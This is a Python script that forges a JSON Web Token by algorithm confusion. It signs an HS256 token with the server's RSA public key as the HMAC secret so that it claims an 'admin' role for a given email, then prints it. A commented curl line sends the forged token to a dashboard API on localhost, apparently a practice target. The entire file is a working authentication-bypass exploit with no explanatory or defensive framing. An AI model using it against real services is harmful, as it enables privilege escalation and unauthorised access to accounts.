import base64, json, hmac, hashlib

def b64url(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

# Read public key
with open("public.pem", "rb") as f:
    pub_key = f.read()  # This becomes the HMAC "secret"

# Step 1: Create header and payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "m4dm4n@mail.com",
    "role": "admin",
    "iat": 1751420825,
    "exp": 1752025625
}

# Step 2: Base64url encode
header_b64 = b64url(json.dumps(header).encode())
payload_b64 = b64url(json.dumps(payload).encode())

# Step 3: Concatenate header and payload
msg = f"{header_b64}.{payload_b64}".encode()

# Step 4: Sign using HMAC-SHA256 with public key as secret
signature = hmac.new(pub_key, msg, hashlib.sha256).digest()
signature_b64 = b64url(signature)

# Final forged JWT
token = f"{header_b64}.{payload_b64}.{signature_b64}"
print(token)

#curl -H "Authorization: Bearer <forged jwt>" http://127.0.0.1:8888/identity/api/v2/user/dashboard
